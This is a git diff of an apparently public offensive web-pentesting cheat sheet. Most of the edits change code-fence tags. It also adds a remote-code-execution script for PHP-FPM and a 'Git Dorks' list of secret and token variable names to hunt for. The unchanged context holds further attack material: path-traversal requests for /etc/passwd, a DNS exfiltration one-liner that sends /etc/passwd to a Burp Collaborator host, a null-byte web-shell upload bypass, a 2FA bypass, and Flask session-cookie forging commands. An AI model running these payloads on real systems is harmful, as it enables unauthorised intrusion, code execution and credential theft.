@@ -238,7 +238,7 @@ Enter the code `000000` or `null` to bypass 2FA protection.
 
 ### HTTP Header Payload
 
-```c
+```console
 $ curl -I http://<RHOST> -H "X-Client-IP: 127.0.0.1"
 $ curl -I http://<RHOST> -H "X-CLIENT-IP: 127.0.0.1"
 $ curl -I http://<RHOST> -H "X-Client-Ip: 127.0.0.1"
@@ -277,9 +277,11 @@ $ curl -I http://<RHOST> -H "X-Client-Ip: 127.0.0.1"
 
 ### Bypass List
 
-> https://<RHOST>/admin/password/edit
+```console
+https://<RHOST>/admin/password/edit
+```
 
-```c
+```console
 ?
 ??
 &
@@ -313,13 +315,13 @@ $ curl -I http://<RHOST> -H "X-Client-Ip: 127.0.0.1"
 
 #### Automation using ffuf
 
-```c
+```console
 $ ffuf -w /PATH/TO/WORDLIST/<WORDLIST> -u http://<RHOST>/api/v2/FUZZ -H 'Authorization: Bearer <TOKEN>' -mc 401,403,405,415,200
 ```
 
 #### Manual Enumeration
 
-```c
+```console
 $ curl -ik http://<RHOST>/api/v2/list -X OPTIONS -H 'Authorization: Bearer <TOKEN>'
 $ curl -ik http://<RHOST>/api/v2/list -X POST -H 'Authorization: Bearer <TOKEN>'
 $ curl -ik http://<RHOST>/api/v2/list -X POST -H 'Authorization: Bearer <TOKEN>' -H 'Content-Type: application/json' -d '{"title":"test123"}'
@@ -329,22 +331,20 @@ $ curl -ik http://<RHOST>/api/v2/list -X POST -H 'Authorization: Bearer <TOKEN>'
 
 ## Arjun
 
-```c
-https://github.com/s0md3v/Arjun
-```
+> https://github.com/s0md3v/Arjun
 
-```c
+```console
 $ pipx install arjun
 ```
 
-```c
+```console
 $ arjun -u <RHOST>
 $ arjun -u <RHOST> -m <METHOD>
 ```
 
 ## Asset Discovery
 
-```c
+```console
 $ curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sed '/^\./d'
 ```
 
@@ -359,7 +359,7 @@ $ curl -s -k "https://jldc.me/anubis/subdomains/example.com" | grep -Po "((http|
 
 ### Shortcuts
 
-```c
+```console
 Ctrl+r          // Sending request to repeater
 Ctrl+i          // Sending request to intruder
 Ctrl+Shift+b    // base64 encoding
@@ -370,7 +370,7 @@ Ctrl+Shift+u    // URL decoding
 
 Burp Suite > Proxy > Proxy settings > TLS pass through
 
-```c
+```console
 .*\.google\.com 
 .*\.gstatic\.com
 .*\.mozilla\.com
@@ -380,7 +380,7 @@ Burp Suite > Proxy > Proxy settings > TLS pass through
 
 ### Set Proxy Environment Variables
 
-```c
+```console
 $ export http_proxy=http://localhost:8080
 $ export https_proxy=https://localhost:8080
 $ http_proxy=localhost:8080 https_proxy=localhost:8080 <COMMAND> <RHOST>
@@ -418,7 +418,7 @@ $ http_proxy=localhost:8080 https_proxy=localhost:8080 <COMMAND> <RHOST>
 
 ### Filter for SSRF (AutoRepeater)
 
-```c
+```console
 ((?:[a-zA-Z]{1,10}://|//)[^"'/]{1,}\.[a-zA-Z]{2,}[^"']{0,})
 ```
 
@@ -436,21 +436,21 @@ $ http_proxy=localhost:8080 https_proxy=localhost:8080 <COMMAND> <RHOST>
 
 Create a `PHP Reverse / Web Shell`, name it `shell.phpX.pdf` and `zip` it.
 
-```c
+```console
 $ touch shell.phpX.pdf
 $ zip shell.zip shell.phpX.pdf
 ```
 
 Open the `Zip Archive` in your favourite `Hex Editor`.
 
-```c
+```console
 00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
 00000A90  2E 70 68 70 58 2E 70 64  66 55 54 05 00 03 A3 6F  .phpX.pdfUT....o
 ```
 
 Replace the `X` with `Null Bytes (00)` and save it.
 
-```c
+```console
 00000A80  00 01 00 00 00 A4 81 00  00 00 00 73 68 65 6C 6C  ...........shell
 00000A90  2E 70 68 70 00 2E 70 64  66 55 54 05 00 03 A3 6F  .php..pdfUT....o
 ```
@@ -461,13 +461,13 @@ After uploading you can remove the `space` and access the file.
 
 ### General Usage
 
-```c
+```console
 $ cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
 ```
 
 ### Common Commands
 
-```c
+```console
 dav:/<WEBDAV_DIRECTORY>/> cd C
 dav:/<WEBDAV_DIRECTORY>/C/> ls
 dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
@@ -487,23 +487,23 @@ dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
 
 ### Filter Bypass
 
-```c
+```console
 $payload = "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 ```
 
 ## commix
 
-```c
+```console
 $ python3 commix.py --url="http://<RHOST>:5013/graphql" --data='{"query":"query{systemDebug(arg:\"test \")}"}' -p arg
 ```
 
 ## Common File Extensions
 
-```c
+```console
 7z,action,ashx,asp,aspx,backup,bak,bk,bz,c,cgi,conf,config,dat,db,dhtml,do,doc,docm,docx,dot,dotm,go,htm,html,ini,jar,java,js,js.map,json,jsp,jsp.source,jspx,jsx,log,old,pdb,pdf,php,phtm,phtml,pl,py,pyc,pyz,rar,rhtml,shtm,shtml,sql,sqlite3,svc,tar,tar.bz2,tar.gz,tsx,txt,wsdl,xhtm,xhtml,xls,xlsm,xlst,xlsx,xltm,xml,zip
 ```
 
-```c
+```console
 .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bk,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.php,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
 ```
 
@@ -511,7 +511,7 @@ $ python3 commix.py --url="http://<RHOST>:5013/graphql" --data='{"query":"query{
 
 ### Common Commands
 
-```c
+```console
 $ curl --trace - http://<RHOST>
 ```
 
@@ -519,19 +519,19 @@ $ curl --trace - http://<RHOST>
 
 #### POST File
 
-```c
+```console
 $ curl -X POST -F "file=@/PATH/TO/FILE/<FILE>.php" http://<RHOST>/<FILE>.php --cookie "cookie"
 ```
 
 #### POST Binary Data to Web Form
 
-```c
+```console
 $ curl -F "field=<file.zip" http://<RHOST>/<FILE>.php -F 'k=v' --cookie "k=v;" -F "submit=true" -L -v
 ```
 
 ## davtest
 
-```c
+```console
 $ davtest -auth <USERNAME>:<FOOBAR> -sendbd auto -url http://<RHOST>/<WEBDAV_DIRECTORY>/
 ```
 
@@ -539,7 +539,7 @@ $ davtest -auth <USERNAME>:<FOOBAR> -sendbd auto -url http://<RHOST>/<WEBDAV_DIR
 
 > https://github.com/KajanM/DirBuster
 
-```c
+```console
 -r    // don't search recursively
 -w    // scan with big wordlists
 
@@ -550,7 +550,7 @@ $ dirb http://<RHOST>
 
 ### Skeleton Payload Request
 
-```c
+```console
 GET /../../../../../../../../etc/passwd HTTP/1.1
 Host: <RHOST>:<RPORT>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -565,7 +565,7 @@ Upgrade-Insecure-Requests: 1
 
 ### Read /etc/passwd
 
-```c
+```console
 GET // HTTP/1.1
 Host: <RHOST>:<RPORT>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
@@ -584,7 +584,7 @@ Upgrade-Insecure-Requests: 1GET /../../../../../../../../etc/passwd HTTP/1.1
 
 ### General Usage
 
-```c
+```console
 -i    // includes specific status codes
 -e    // excludes specific status codes
 -x    // excludes specific status codes
@@ -593,7 +593,7 @@ Upgrade-Insecure-Requests: 1GET /../../../../../../../../etc/passwd HTTP/1.1
 
 ### Common Commands
 
-```c
+```console
 $ dirsearch -u http://<RHOST>:<RPORT>
 $ dirsearch -u http://<RHOST>:<RPORT> -m POST
 $ dirsearch -u http://<RHOST>:<RPORT> -e *
@@ -602,7 +602,7 @@ $ dirsearch -u http://<RHOST>:<RPORT>/ -R 5 -e http,php,html,css /usr/share/word
 
 ## DNS Smuggling
 
-```c
+```console
 GETID=$(cat /etc/passwd | head -n 1 | base64) && nslookup $GETID.0wdj2957gw6t7g5463t7063hy.burpcollborator.net
 ```
 
@@ -610,7 +610,7 @@ GETID=$(cat /etc/passwd | head -n 1 | base64) && nslookup $GETID.0wdj2957gw6t7g5
 
 > https://github.com/Keramas/DS_Walk
 
-```c
+```console
 $ python ds_walk.py -u http://<RHOST>
 ```
 
@@ -618,15 +618,44 @@ $ python ds_walk.py -u http://<RHOST>
 
 > https://wiki.owasp.org/index.php/OWASP_favicon_database
 
-```c
+```console
 $ curl https://<RHOST>/sites/favicon/images/favicon.ico | md5sum
+```
+
+## FastCGI Process Manager (FPM)
+
+> https://github.com/hannob/fpmvuln
+
+> https://github.com/hannob/fpmvuln/blob/master/fpmrce
+
+```bash
+#!/bin/bash
+
+# script will try to execute PHP code on target host
+
+PAYLOAD="<?php echo 1382+3871;" # add payload here
+FILENAMES="/usr/bin/phar.phar /usr/share/php/PEAR.php" # replace one or more file paths with on the target existing php files
+
+HOST=$1
+B64=$(echo "$PAYLOAD"|base64)
+
+for FN in $FILENAMES; do
+    OUTPUT=$(mktemp)
+    env -i \
+      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
+      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
+      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT
+
+    grep -q 5253 $OUTPUT
+    [ $? -eq 0 ] && echo "+++ RCE success with $FN on $HOST, output in $OUTPUT"
+done
 ```
 
 ## feroxbuster
 
 > https://github.com/epi052/feroxbuster
 
-```c
+```console
 $ feroxbuster -u http://<RHOST> -s <STATUS_CODES>
 $ feroxbuster -u http://<RHOST> -x js,bak,txt,png,jpg,jpeg,php,aspx,html --extract-links
 ```
@@ -637,7 +666,7 @@ $ feroxbuster -u http://<RHOST> -x js,bak,txt,png,jpg,jpeg,php,aspx,html --extra
 
 > https://github.com/ffuf/ffuf/wiki
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
 $ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
 $ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
@@ -647,35 +676,35 @@ $ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u htt
 
 ### API Fuzzing
 
-```c
+```console
 $ ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
 ```
 
 ### Fuzzing with PHP Session ID
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
 ```
 
 ### Fuzzing with HTTP Request File
 
-```c
+```console
 $ ffuf -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -request <FILE> -request-proto "https" -mc 302 -t 150 | tee progress
 ```
 
 ### Searching for LFI
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
 ```
 
 ### Server-Side Request Forgery (SSRF)
 
-```c
+```console
 $ seq 1 65535 | ffuf -w - -u http://<RHOST> -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'url=http%3A%2F%2Flocalhost%3AFUZZ'
 ```
 
-```c
+```console
 $ seq 1 65535 | ffuf -w - -u http://<RHOST> -X POST -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylUeVtv36vebZPACI" -d '------WebKitFormBoundarylUeVtv36vebZPACI            
 Content-Disposition: form-data; name="foobar"
 
@@ -690,7 +719,7 @@ Content-Type: application/octet-stream
 
 #### Request File Example
 
-```c
+```console
 $ seq 1 10000 | ffuf -w - -request <FILE>.req -u http://<RHOST> -fr "<PATTERN>"
 ```
 
@@ -700,49 +729,49 @@ $ seq 1 10000 | ffuf -w - -request <FILE>.req -u http://<RHOST> -fr "<PATTERN>"
 
 #### Basic
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ
 ```
 
 #### Recursion
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/basic/FUZZ -recursion
 ```
 
 #### File Extensions
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/ext/logs/FUZZ -e .log
 ```
 
 #### No 404 Header
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/no404/FUZZ -fs 669
 ```
 
 #### Param Mining
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://ffuf.me/cd/param/data?FUZZ=1
 ```
 
 #### Rate Limiting
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://ffuf.test/cd/rate/FUZZ -mc 200,429
 ```
 
 #### IDOR Testing
 
-```c
+```console
 $ seq 1 1000 | ffuf -w - -u http://ffuf.me/cd/pipes/user?id=FUZZ
 ```
 
 #### Script for IDOR Testing
 
-```c
+```bash
 #!/bin/bash
 
 while read i
@@ -759,25 +788,25 @@ done
 
 #### Use Script above for Base64 decoding
 
-```c
+```console
 $ seq 1 1000 | /usr/local/bin/hashit b64 | ffuf -w - -u http://ffuf.me/cd/pipes/user2?id=FUZZ
 ```
 
 #### MD5 Discovery using the Script
 
-```c
+```console
 $ seq 1 1000 | /usr/local/bin/hashit md5 | ffuf -w - -u http://ffuf.me/cd/pipes/user3?id=FUZZ
 ```
 
 #### Virtual Host Discovery
 
-```c
+```console
 $ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me -fs 1495
 ```
 
 #### Massive File Extension Discovery
 
-```c
+```console
 $ ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<TARGET>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
 ```
 
@@ -785,37 +814,37 @@ $ ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<
 
 > https://github.com/Paradoxis/Flask-Unsign
 
-```c
+```console
 $ pip3 install flask-unsign
 ```
 
 ### Decode Cookie
 
-```c
+```console
 $ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
 ```
 
 ### Brute Force
 
-```c
+```console
 $ flask-unsign --unsign --cookie < cookie.txt
 ```
 
 ### Unsigning a Cookie
 
-```c
+```console
 $ flask-unsign --unsign --no-literal-eval --wordlist /PATH/TO/WORDLIST/<FILE>.txt --cookie eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZm9vYmFyIn0.Yq4QPw.0Hj2xCfDMJi7ksNfR4Oe9yN7nYQ
 ```
 
 ### Signing a Cookie
 
-```c
-$ flask-unsign --sign --legacy --secret '<PASSWORD>' --cookie "{'logged_in': True, 'username': '<USER>'}"
+```console
+$ flask-unsign --sign --legacy --secret '<PASSWORD>' --cookie "{'logged_in': True, 'username': '<USERNAME>'}"
 ```
 
 ### Signing a UUID Cookie
 
-```c
+```console
 $ flask-unsign --sign --cookie "{'logged_in': True}" --secret '<PASSWORD>'
 $ flask-unsign --sign --cookie "{'cart_items': ["2" , "5" , "6"], 'uuid': 'e9e62997-0291-4f63-8dbe-10d035326c75' }" --secret '<SECRET_KEY>'
 ```
@@ -824,15 +853,1421 @@ $ flask-unsign --sign --cookie "{'cart_items': ["2" , "5" , "6"], 'uuid': 'e9e62
 
 > https://github.com/tomnomnom/gf
 
-```c
+```console
 $ go install github.com/tomnomnom/gf@latest
+```
+
+## Git Dorks
+
+```console
+GITHUB_TOKEN=
+PATH=
+CODECLIMATE_REPO_TOKEN=
+DOCKER_PASSWORD=
+NPM_TOKEN=
+GH_TOKEN=
+encrypted_02ddd67d5586_iv=
+encrypted_517c5824cb79_key=
+encrypted_02ddd67d5586_key=
+encrypted_517c5824cb79_iv=
+encrypted_1366e420413c_key=
+encrypted_1366e420413c_iv=
+DOCKER_USERNAME=
+ARTIFACTS_SECRET=
+ARTIFACTS_KEY=
+SURGE_TOKEN=
+SURGE_LOGIN=
+ARTIFACTS_BUCKET=
+SAUCE_ACCESS_KEY=
+SAUCE_USERNAME=
+DB_USER=
+DB_PORT=
+DB_HOST=
+DBP=
+javascriptEnabled=
+acceptSslCerts=
+AWS_ACCESS_KEY_ID=
+AWS_SECRET_ACCESS_KEY=
+DOCKER_EMAIL=
+GH_USER_EMAIL=
+GH_USER_NAME=
+CLOUDINARY_URL=
+COVERALLS_REPO_TOKEN=
+CF_PASSWORD=
+CF_SPACE=
+CF_USERNAME=
+CF_ORGANIZATION=
+WPT_REPORT_API_KEY=
+USABILLA_ID=
+encrypted_17b59ce72ad7_key=
+encrypted_17b59ce72ad7_iv=
+NGROK_TOKEN=
+rotatable=
+CLOUDINARY_URL_STAGING=
+encrypted_2c8d10c8cc1d_key=
+encrypted_2c8d10c8cc1d_iv=
+SRCCLR_API_TOKEN=
+NPM_AUTH_TOKEN=
+takesScreenshot=
+GH_UNSTABLE_OAUTH_CLIENT_SECRET=
+GH_OAUTH_CLIENT_SECRET=
+GH_NEXT_UNSTABLE_OAUTH_CLIENT_SECRET=
+GH_UNSTABLE_OAUTH_CLIENT_ID=
+GH_OAUTH_CLIENT_ID=
+GH_NEXT_OAUTH_CLIENT_ID=
+GH_NEXT_UNSTABLE_OAUTH_CLIENT_ID=
+GH_NEXT_OAUTH_CLIENT_SECRET=
+marionette=
+NPM_CONFIG_AUDIT=
+FTP_PW=
+FTP_LOGIN=
+NPM_CONFIG_STRICT_SSL=
+--ignore-ssl-errors=
+TRAVIS_SECURE_ENV_VARS=
+FOSSA_API_KEY=
+VIP_GITHUB_DEPLOY_KEY=
+SIGNING_KEY_SID=
+SIGNING_KEY_SECRET=
+ACCOUNT_SID=
+API_KEY_SID=
+API_KEY_SECRET=
+CI_DEPLOY_PASSWORD=
+CONFIGURATION_PROFILE_SID_SFU=
+CONFIGURATION_PROFILE_SID_P2P=
+ANACONDA_TOKEN=
+CC_TEST_REPORTER_ID=
+OS_TENANT_NAME=
+OS_TENANT_ID=
+OS_PROJECT_NAME=
+OS_AUTH_URL=
+OS_USERNAME=
+OS_PASSWORD=
+OS_REGION_NAME=
+node_pre_gyp_secretAccessKey=
+node_pre_gyp_accessKeyId=
+encrypted_a2e547bcd39e_key=
+encrypted_a2e547bcd39e_iv=
+encrypted_17cf396fcb4f_key=
+encrypted_17cf396fcb4f_iv=
+datadog_api_key=
+accessibilityChecks=
+acceptInsecureCerts=
+CI_DEPLOY_USERNAME=
+cssSelectorsEnabled=
+SONATYPE_PASSWORD=
+tester_keys_password=
+GITHUB_OAUTH_TOKEN=
+webStorageEnabled=
+locationContextEnabled=
+nativeEvents=
+handlesAlerts=
+databaseEnabled=
+browserConnectionEnabled=
+applicationCacheEnabled=
+hasTouchScreen=
+takesHeapSnapshot=
+networkConnectionEnabled=
+mobileEmulationEnabled=
+scope=
+ALGOLIA_API_KEY=
+encrypted_e05f6ccc270e_key=
+encrypted_e05f6ccc270e_iv=
+DANGER_GITHUB_API_TOKEN=
+PYPI_PASSWORD=
+VIP_GITHUB_BUILD_REPO_DEPLOY_KEY=
+SSMTP_CONFIG=
+COVERITY_SCAN_TOKEN=
+CODECOV_TOKEN=
+SIGNING_KEY=
+GPG_ENCRYPTION=
+NEW_RELIC_BETA_TOKEN=
+ALGOLIA_APPLICATION_ID=
+PACKAGECLOUD_TOKEN=
+takesElementScreenshot=
+raisesAccessibilityExceptions=
+DOCKER_USER=
+datadog_app_key=
+encrypted_cb02be967bc8_key=
+encrypted_cb02be967bc8_iv=
+MAPBOX_ACCESS_TOKEN=
+GITHUB_DEPLOYMENT_TOKEN=
+ROPSTEN_PRIVATE_KEY=
+RINKEBY_PRIVATE_KEY=
+KOVAN_PRIVATE_KEY=
+bintrayUser=
+sonatypeUsername=
+sonatypePassword=
+bintrayKey=
+SECRET_1=
+SECRET_0=
+SECRET_9=
+SECRET_8=
+SECRET_7=
+SECRET_6=
+SECRET_5=
+SECRET_4=
+SECRET_3=
+SECRET_2=
+SECRET_11=
+SECRET_10=
+TRAVIS_COM_TOKEN=
+AWS_DEFAULT_REGION=
+GITHUB_ACCESS_TOKEN=
+PYPI_USERNAME=
+BINTRAY_APIKEY=
+BUNDLE_ZDREPO__JFROG__IO=
+COCOAPODS_TRUNK_TOKEN=
+OCTEST_SERVER_BASE_URL=
+OCTEST_APP_USERNAME=
+OCTEST_APP_PASSWORD=
+OKTA_CLIENT_TOKEN=
+HEROKU_API_KEY=
+DATABASE_PASSWORD=
+encrypted_0d22c88004c9_key=
+encrypted_0d22c88004c9_iv=
+BUNDLESIZE_GITHUB_TOKEN=
+IOS_DOCS_DEPLOY_TOKEN=
+COVERALLS_TOKEN=
+CLOUDINARY_URL_EU=
+HEROKU_API_USER=
+OKTA_CLIENT_ORGURL=
+VIRUSTOTAL_APIKEY=
+PUSHOVER_USER=
+PUSHOVER_TOKEN=
+HB_CODESIGN_KEY_PASS=
+HB_CODESIGN_GPG_PASS=
+isbooleanGood=
+BROWSER_STACK_USERNAME=
+BROWSER_STACK_ACCESS_KEY=
+SNYK_TOKEN=
+rTwPXE9XlKoTn9FTWnAqF3MuWaLslDcDKYEh7OaYJjF01piu6g4Nc=
+lr7mO294=
+NtkUXxwH10BDMF7FMVlQ4zdHQvyZ0=
+AURORA_STRING_URL=
+TREX_OKTA_CLIENT_TOKEN=
+TREX_OKTA_CLIENT_ORGURL=
+GPG_PASSPHRASE=
+encrypted_5d419efedfca_key=
+encrypted_5d419efedfca_iv=
+ACCESS_KEY_SECRET=
+ACCESS_KEY_ID=
+props.disabled=
+ALGOLIA_API_KEY_MCM=
+BINTRAY_API_KEY=
+DOCKER_PASS=
+TRIGGER_API_COVERAGE_REPORTER=
+FIREBASE_TOKEN=
+OSSRH_USERNAME=
+7QHkRyCbP98Yv2FTXrJFcx9isA2viFx2UxzTsvXcAKHbCSAw=
+dockerhubUsername=
+dockerhubPassword=
+SECRET_KEY_BASE=
+repoToken=
+encrypted_28c9974aabb6_key=
+encrypted_28c9974aabb6_iv=
+SONATYPE_USERNAME=
+NGROK_AUTH_TOKEN=
+FI2_SIGNING_SEED=
+FI2_RECEIVING_SEED=
+FI1_SIGNING_SEED=
+FI1_RECEIVING_SEED=
+CONTENTFUL_ORGANIZATION=
+CONTENTFUL_ACCESS_TOKEN=
+ANSIBLE_VAULT_PASSWORD=
+FIREBASE_PROJECT=
+ALGOLIA_SEARCH_API_KEY=
+BINTRAY_USER=
+encrypted_fb9a491fd14b_key=
+encrypted_fb9a491fd14b_iv=
+CODACY_PROJECT_TOKEN=
+MANAGEMENT_TOKEN=
+CONFIGURATION_PROFILE_SID=
+NOW_TOKEN=
+encrypted_90a9ca14a0f9_key=
+encrypted_90a9ca14a0f9_iv=
+IJ_REPO_USERNAME=
+IJ_REPO_PASSWORD=
+GITHUB_KEY=
+pLytpSCciF6t9NqqGZYbBomXJLaG84=
+encrypted_8a915ebdd931_key=
+encrypted_8a915ebdd931_iv=
+encrypted_0fb9444d0374_key=
+encrypted_0fb9444d0374_iv=
+encrypted_b98964ef663e_key=
+encrypted_b98964ef663e_iv=
+encrypted_50ea30db3e15_key=
+encrypted_50ea30db3e15_iv=
+SONAR_TOKEN=
+API_KEY=
+encrypted_a47108099c00_key=
+encrypted_a47108099c00_iv=
+OSSRH_SECRET=
+GH_API_KEY=
+PROJECT_CONFIG=
+encrypted_f19708b15817_key=
+encrypted_f19708b15817_iv=
+encrypted_568b95f14ac3_key=
+encrypted_568b95f14ac3_iv=
+encrypted_4664aa7e5e58_key=
+encrypted_4664aa7e5e58_iv=
+ORG_GRADLE_PROJECT_SONATYPE_NEXUS_USERNAME=
+ORG_GRADLE_PROJECT_SONATYPE_NEXUS_PASSWORD=
+encrypted_54c63c7beddf_key=
+encrypted_54c63c7beddf_iv=
+CONTENTFUL_INTEGRATION_SOURCE_SPACE=
+CONTENTFUL_INTEGRATION_MANAGEMENT_TOKEN=
+BLUEMIX_API_KEY=
+UzhH1VoXksrNQkFfc78sGxD0VzLygdDJ7RmkZPeBiHfX1yilToi1yrlRzRDLo46LvSEEiawhTa1i9W3UGr3p4LNxOxJr9tR9AjUuIlP21VEooikAhRf35qK0=
+ALGOLIA_APP_ID_MCM=
+MAILGUN_PUB_KEY=
+MAILGUN_PRIV_KEY=
+MAILGUN_DOMAIN=
+ALGOLIA_APPLICATION_ID_MCM=
+encrypted_1528c3c2cafd_key=
+encrypted_1528c3c2cafd_iv=
+CASPERJS_TIMEOUT=
+COS_SECRETS=
+ATOKEN=
+PASSWORD=
+GITHUB_DEPLOY_HB_DOC_PASS=
+COVERITY_SCAN_NOTIFICATION_EMAIL=
+CONTENTFUL_CMA_TEST_TOKEN=
+DOCKER=
+5oLiNgoXIh3jFmLkXfGabI4MvsClZb72onKlJs8WD7VkusgVOrcReD1vkAMv7caaO4TqkMAAuShXiks2oFI5lpHSz0AE1BaI1s6YvwHQFlxbSQJprJd4eeWS9l78mYPJhoLRaWbvf0qIJ29mDSAgAJ7XI=
+Q67fq4bD04RMM2RJAS6OOYaBF1skYeJCblwUk=
+COVERALLS_API_TOKEN=
+MapboxAccessToken=
+FIREBASE_API_TOKEN=
+TWINE_PASSWORD=
+0dysAuQ5KQk=
+USERNAME=
+encrypted_91ee6a0187b8_key=
+encrypted_91ee6a0187b8_iv=
+OSSRH_PASS=
+OSSRH_USER=
+setWindowRect=
+SCRUTINIZER_TOKEN=
+CLUSTER_NAME=
+OC_PASS=
+APP_NAME=
+GITHUB_API_KEY=
+COCOAPODS_TRUNK_EMAIL=
+ORG_ID=
+OSSRH_JIRA_USERNAME=
+OSSRH_JIRA_PASSWORD=
+DH_END_POINT_1=
+CI_DEPLOY_USER=
+CONTENTFUL_MANAGEMENT_API_ACCESS_TOKEN=
+WEBHOOK_URL=
+SLACK_CHANNEL=
+APIARY_API_KEY=
+=
+SONATYPE_USER=
+TWINE_USERNAME=
+WPJM_PHPUNIT_GOOGLE_GEOCODE_API_KEY=
+SONAR_ORGANIZATION_KEY=
+DEPLOY_USER=
+SONAR_PROJECT_KEY=
+ZZiigPX7RCjq5XHbzUpPpMbC8MFxT2K3jcFXUitfwZvNaZXJIiK3ZQJU4ayKaegLvI91x1SqH0=
+encrypted_2620db1da8a0_key=
+encrypted_2620db1da8a0_iv=
+CLIENT_ID=
+AWS_REGION=
+AWS_S3_BUCKET=
+encrypted_2fb4f9166ccf_key=
+encrypted_2fb4f9166ccf_iv=
+EXP_USERNAME=
+EXP_PASSWORD=
+TRAVIS_TOKEN=
+ALGOLIA_APPLICATION_ID_2=
+ALGOLIA_APPLICATION_ID_1=
+ALGOLIA_ADMIN_KEY_2=
+ALGOLIA_ADMIN_KEY_1=
+PAYPAL_CLIENT_SECRET=
+PAYPAL_CLIENT_ID=
+EMAIL_NOTIFICATION=
+BINTRAY_KEY=
+BRACKETS_REPO_OAUTH_TOKEN=
+PLACES_APPLICATION_ID=
+PLACES_API_KEY=
+ARGOS_TOKEN=
+encrypted_f50468713ad3_key=
+encrypted_f50468713ad3_iv=
+EXPORT_SPACE_ID=
+encrypted_e44c58426490_key=
+encrypted_e44c58426490_iv=
+ALGOLIA_APP_ID=
+GPG_KEYNAME=
+SVN_USER=
+SVN_PASS=
+ENCRYPTION_PASSWORD=
+SPOTIFY_API_CLIENT_SECRET=
+SPOTIFY_API_CLIENT_ID=
+SPOTIFY_API_ACCESS_TOKEN=
+env.HEROKU_API_KEY=
+COMPONENT=
+URL=
+STAR_TEST_SECRET_ACCESS_KEY=
+STAR_TEST_LOCATION=
+STAR_TEST_BUCKET=
+STAR_TEST_AWS_ACCESS_KEY_ID=
+ARTIFACTS_AWS_SECRET_ACCESS_KEY=
+ARTIFACTS_AWS_ACCESS_KEY_ID=
+encrypted_ce33e47ba0cf_key=
+encrypted_ce33e47ba0cf_iv=
+DEPLOY_DIR=
